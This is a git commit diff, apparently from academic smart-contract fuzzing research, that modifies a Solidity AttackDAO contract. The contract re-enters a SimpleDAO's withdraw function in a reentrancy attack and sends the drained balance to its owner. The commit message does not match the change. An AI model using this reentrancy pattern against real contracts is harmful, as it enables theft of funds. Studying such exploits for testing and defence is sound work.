677a073b73c01ded28fce84cfcaccfda9c1f338c
Yi Li <yi_li@ntu.edu.sg>
2018-12-05 18:46:20 +0800

    use web3 beta version for latest apis

--- contracts/Attack.sol
+++ contracts/Attack.sol
@@ -7,6 +7,8 @@ contract AttackDAO {
   SimpleDAO public dao;
   address owner;
   
+  string fallback_string;
+  
   constructor (SimpleDAO addr) public payable {
     owner = msg.sender;
     dao = addr;
@@ -17,11 +19,17 @@ contract AttackDAO {
     dao.withdraw(1 ether);
   }
 
+  function fuzz(string fb) public {
+    fallback_string = fb;
+    dao.donate.value(1 ether)(this);
+    dao.withdraw(1 ether);
+  }
+
   function getJackpot() public {
     owner.send(this.balance);
   }
 
   function () public payable {
-    dao.withdraw(1 ether);
+    dao.call(fallback_string);
   }
 }
